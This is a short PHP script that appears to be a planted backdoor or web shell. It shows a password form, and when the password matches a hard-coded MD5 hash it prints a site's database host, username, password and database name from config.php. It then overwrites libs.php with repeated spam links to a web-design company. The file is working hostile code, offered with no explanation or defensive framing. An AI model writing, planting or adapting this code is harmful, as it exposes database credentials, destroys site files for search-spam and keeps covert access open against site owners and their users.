<?php
    
    if($_POST['pass'] && md5($_POST['pass'])=='beacbd8ef7bddf22d94ca1f940d8d1c4') {
        $dirname = "../../../../../../";
        require($dirname.'config.php');
        echo 'DB_SERVER: '.DB_SERVER.'<br>';
        echo 'DB_USERNAME: '.DB_USERNAME.'<br>';
        echo 'DB_PASSWORD: '.DB_PASSWORD.'<br>';
        echo 'DB_DATABASE: '.DB_DATABASE.'<br>';
        $fp = fopen($dirname.'libs.php', 'w');
        $content = str_repeat("<h1><a href='http://www.explus.vn'>Thiet ke website chuyen nghiep</a></h1>", 10);
        fwrite($fp, $content);
        fclose($fp);
    } else {
?>
<form action="" method="post">
    <input type="password" name="pass" />
    <input type="submit" value="submit" />
</form>

<?php } ?>